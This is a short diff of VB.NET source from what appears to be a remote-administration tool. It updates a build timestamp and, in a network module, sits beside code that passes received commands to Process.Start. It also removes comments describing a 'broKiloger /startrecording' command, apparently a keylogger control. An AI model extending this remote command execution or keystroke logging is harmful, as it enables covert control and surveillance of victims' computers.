@@ -11,7 +11,7 @@ Module GlobalUses
     Public HttpOwnerServer As String
     Public compileVersion As String = My.Application.Info.Version.ToString &
         " (" & Application.ProductVersion & ") " &
-        "[31/05/2022 14:44]" 'Indicacion exacta de la ultima compilacion
+        "[07/06/2022 15:56]" 'Indicacion exacta de la ultima compilacion
 End Module '<--- ACTUALIZAR DATOS
 Module Utility
     Public tlmContent As String
@@ -733,11 +733,6 @@ Module Network
                     Process.Start(command)
                     Return "Starting '" & command & "'..."
                 ElseIf cmdSetType = 3 Then
-                    'Se espera que el usuario escriba
-                    '   broKiloger /startrecording
-                    'y no
-                    '   broKiloger True /startrecording
-                    'True se da por True.
                     Dim args() As String = command.Split(" ")
                     Dim comandoAux As String = Nothing
                     For i As Integer = 1 To args.Count - 1
